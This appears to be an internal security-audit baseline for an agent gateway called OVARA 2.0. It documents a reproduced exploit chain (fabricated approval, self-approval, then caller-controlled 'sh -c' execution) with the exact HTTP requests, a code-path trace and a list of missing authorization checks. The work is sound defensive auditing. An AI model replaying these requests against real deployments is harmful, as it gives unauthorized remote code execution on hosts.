# OVARA 2.0 — P0.5 Remediation Baseline

State frozen BEFORE any remediation changes.

## Commit

    7fc1b685463efc7828a34c5a1ff697c2a4040aa2 (feat/executor-proxy)

Working tree: only audit artifacts untracked (docs, findings, tests).
No production modifications.

## Exploit reproduction (last run on this commit)

Deployment: `/tmp/cleanroom/env` — gateway 127.0.0.1:18080 (auth on),
proxy :9443. Steps (all succeed on this commit):

    TOKEN=<operator token from env/config.json>

    # 1. Fabricate an approval — decision_id does NOT exist anywhere:
    POST /v1/approval/create
      {"decision_id":"dec_p05_fake","action_type":"shell",
       "resource":"shell:echo P05-REPRO > /tmp/p05-pwn.txt",
       "agent_id":"p05","environment":"local"}
    → 201 {"approval_id":"apr_b006c08b-706b-4a","status":"pending"}

    # 2. Self-approve:
    POST /v1/approval/apr_b006c08b-706b-4a/approve
      {"resolved_by":"attacker"}
    → {"status":"approved"}

    # 3. Orchestrator (~2s) claims continuation → ShellExecutor:
    sh -c 'echo P05-REPRO > /tmp/p05-pwn.txt'   → file created. RCE.

## Exact code path (this commit)

    handlers/approval.go:55 handleCreate
      - validates ONLY decision_id+action_type non-empty (line 73)
      - NEVER consults the decision cache — decision_id unbound
      - approval/service.go:18 CreateApproval stores caller fields
      - continuation.NewContinuation(decision_id, action, CALLER resource)
        + caller agent_id/env/trust (lines 86-91)
      - continuation persisted StateEscalated
    handlers/approval.go:~173 handleApprove
      - caller-asserted resolved_by; atomic Resolve →
        ApplyApprovalDecision → continuation approved→queued
    continuation/orchestrator.go (~2s drain)
      - ClaimForExecution → execRegistry[action_type]
    pkg/server/server.go:386-455
      - shellExec = NewShellExecutorWithLimits REGISTERED ALWAYS ("shell")
      - "exec", "git.push/pull/fetch/checkout" always registered
      - github.* if token set; ci.trigger if ci_token set
      - continuationHandler.SetExecutor(shellExec) — shell is the default
    execution/store.go ShellExecutor.Execute
      - ParseShellResource strips "shell:" →
        exec.CommandContext(ctx, "sh", "-c", <caller string>)

## Missing authorization checks (root causes)

1. `approval/create`: no decision-cache lookup → approvals exist for
   decisions that never happened. Caller controls executable fields.
2. No request_hash anywhere → nothing binds approval↔request.
3. Host executors registered unconditionally → `shell:`/`exec:`/`git:`
   continuations are host commands by design.
4. `auth/middleware.go`: single token list → any token = all routes.
5. `config.Load`: read error → silently returns open `Default()`;
   shipped etc configs have no auth_enabled/listen_addr.
6. `policy/file_store.go fileRule` + `handlers/policy.go fileRule`:
   no Resource/MinTrust fields → silently dropped on all real loads.
7. `MatchResource`: raw substring glob — no URL parsing.
8. Proxy `:9443` all-interfaces, no client auth.

## Test stack state

Running: gateway pid on 127.0.0.1:18080, proxy on :9443,
netns `audit-ns` (10.200.188.0/24), docker net `audit-egress`
(172.30.0.0/24, icc=false), CA at env/var/ca.pem.
